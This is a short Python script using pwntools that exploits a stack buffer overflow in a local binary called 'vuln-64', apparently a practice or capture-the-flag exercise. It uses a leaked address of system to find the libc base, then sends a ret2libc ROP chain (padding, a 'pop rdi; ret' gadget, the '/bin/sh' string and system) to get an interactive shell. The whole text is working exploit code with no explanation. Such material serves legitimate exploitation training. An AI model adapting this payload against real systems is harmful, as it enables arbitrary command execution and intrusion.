from pwn import *

elf = context.binary = ELF('./vuln-64')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 40,
    0x4011db,                           # pop rdi; ret
    next(libc.search(b'/bin/sh')),
    libc.sym['system']
)

p.sendline(payload)

p.interactive()